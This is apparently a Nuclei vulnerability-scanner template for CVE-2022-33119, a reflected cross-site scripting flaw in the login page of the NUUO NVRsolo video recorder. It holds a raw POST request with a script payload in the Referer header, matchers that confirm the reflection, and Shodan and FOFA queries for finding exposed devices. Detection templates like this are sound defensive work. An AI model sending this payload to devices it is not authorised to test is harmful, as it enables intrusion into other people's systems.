id: CVE-2022-33119

info:
  name: NUUO NVRsolo Video Recorder 03.06.02 - Cross-Site Scripting
  author: arafatansari
  severity: medium
  description: |
    NUUO NVRsolo Video Recorder 03.06.02 contains a reflected cross-site scripting vulnerability via login.php.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patch or upgrade to a non-vulnerable version of the NUUO NVRsolo Video Recorder software.
  reference:
    - https://github.com/badboycxcc/nuuo-xss/blob/main/README.md
    - https://nvd.nist.gov/vuln/detail/CVE-2022-33119
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/badboycxcc/badboycxcc
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-33119
    cwe-id: CWE-79
    epss-score: 0.02
    epss-percentile: 0.83018
    cpe: cpe:2.3:o:nuuo:nvrsolo_firmware:03.06.02:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: nuuo
    product: nvrsolo_firmware
    shodan-query:
      - http.html:"NVRsolo"
      - http.html:"nvrsolo"
    fofa-query: body="nvrsolo"
  tags: cve,cve2022,nvrsolo,xss,nuuo

http:
  - raw:
      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: "><script>alert(document.domain)</script><"

        language=en&user=user&pass=pass&submit=Login

    matchers:
      - type: dsl
        dsl:
          - 'contains(header, "text/html")'
          - 'status_code == 200'
          - contains(body,'<script>alert(document.domain)</script><\"?cmd=')
        condition: and
# digest: 4b0a00483046022100873248d3b7d37c896c140e05278e43e3a7f9853fba40266dc15c806f3302796f022100c2a8e9638faba6c2e179175411e14e62c2a4a918250ce472e29802018cc21578:922c64590222798bb761d5b6d8e72950